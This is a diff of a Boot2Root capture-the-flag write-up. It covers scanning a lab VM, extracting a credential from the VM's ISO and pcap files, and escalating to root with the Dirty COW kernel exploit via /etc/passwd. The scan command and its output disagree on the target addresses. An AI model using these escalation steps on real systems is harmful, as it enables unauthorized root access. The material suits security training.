@@ -1,8 +1,8 @@
 # Boot2Root
 
-## writeup 1
+## write up 2
 
-### 1st step : get the ip of the vm
+### find the ip of the vm
 
 ```
 $ arp-scan -l -I eth0
@@ -12,65 +12,87 @@ Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/
 10.0.2.1 52:54:00:12:35:00 QEMU
 10.0.2.2 52:54:00:12:35:00 QEMU
 10.0.2.3 08:00:27:c9:e5:50 CADMUS COMPUTER SYSTEMS
-10.0.2.17				   08:00:27:6d:9d:0b	CADMUS COMPUTER SYSTEMS
+10.0.2.17 08:00:27:6d:9d:0b	CADMUS COMPUTER SYSTEMS
 ```
 
-or :
-```
-VBoxManage guestproperty enumerate <vm-name>
-```
 
-### step2 : scan the ports on the machine
+### scan vm ports  
 
 ```
-map -p- -T5 -A -sV <vm-addr>(10.0.2.17)
+$ nmap 10.0.2.17
 [...]
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-08 19:27 CEST
-Nmap scan report for 10.0.2.17
-Host is up (0.00025s latency).
-Not shown: 65529 closed ports
-PORT    STATE SERVICE  VERSION
-21/tcp  open  ftp      vsftpd 2.0.8 or later
-|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
-22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
-|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
-|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
-80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
-|_http-server-header: Apache/2.2.22 (Ubuntu)
-|_http-title: Hack me if you can
-143/tcp open  imap     Dovecot imapd
-|_imap-capabilities: more have SASL-IR post-login LOGIN-REFERRALS LITERAL+ Pre-login LOGINDISABLEDA0001 capabilities listed ID OK STARTTLS IDLE IMAP4rev1 ENABLE
-| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
-| Not valid before: 2015-10-08T20:57:30
-|_Not valid after:  2025-10-07T20:57:30
-|_ssl-date: 2018-10-08T17:27:39+00:00; 0s from scanner time.
-443/tcp open  ssl/http Apache httpd 2.2.22
-|_http-server-header: Apache/2.2.22 (Ubuntu)
-|_http-title: 404 Not Found
-| ssl-cert: Subject: commonName=BornToSec
-| Not valid before: 2015-10-08T00:19:46
-|_Not valid after:  2025-10-05T00:19:46
-|_ssl-date: 2018-10-08T17:27:38+00:00; 0s from scanner time.
-993/tcp open  ssl/imap Dovecot imapd
-|_imap-capabilities: more SASL-IR have LOGIN-REFERRALS LITERAL+ Pre-login post-login capabilities listed ID OK AUTH=PLAINA0001 IDLE IMAP4rev1 ENABLE
-| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
-| Not valid before: 2015-10-08T20:57:30
-|_Not valid after:  2025-10-07T20:57:30
-|_ssl-date: 2018-10-08T17:27:39+00:00; 0s from scanner time.
-MAC Address: 08:00:27:6D:9D:0B (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X
-OS CPE: cpe:/o:linux:linux_kernel:3
-OS details: Linux 3.2 - 3.16
-Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-22 14:14 CET
+Nmap scan report for 192.168.80.1
+Host is up (0.00019s latency).
+Not shown: 967 closed ports, 32 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 192.168.80.128
+Host is up (0.00053s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
 ```
 
-here we got 2 or 3 things interesting :
-	 - ftp on 21
-	 - ssh on 22
-	 - http on 80
-	 - https on 443
-	 - mail server on 993 ?
-	 
+### Work around the iso
+
+see the install fs in scripts/
+
+steps :
+- mount the file system os located in the iso
+```
+$ mount /mnt/iso/casper/filesystem.squashfs /mnt/fs/ -t squashfs -o loop
+$ cat /mnt/fs
+[...]
+```
+
+Here we go, there is an archive in /home/LOOKATME
+
+After some trouble we can see there is some .pcap files containing a .c file
+
+With a little script in python we are able to recover the source file an then build it.
+
+### laurie passwd
+
+From here we can connect to the machine with the credentials :
+```
+laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
+
+### Dirty Cow, Race condition ptrace based
+
+we can gather some info on our os :
+
+Kernel version
+```
+$ uname -r
+3.2.0-91-generic-pae
+```
+
+we can, with some research find an exploit with this requirement
+
+Dirty Cow is a race condition exploit who's exploit the ptrace fct.
+
+```
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
+
+$ gcc -pthread dirty.c -o dirty -lcrypt && ./dirty
+[...]
+create password :
+helloworld
+```
+an then :
+```
+$ su firefart
+helloworld
+[...]
+root@root# 
+```
+
+## We became root !
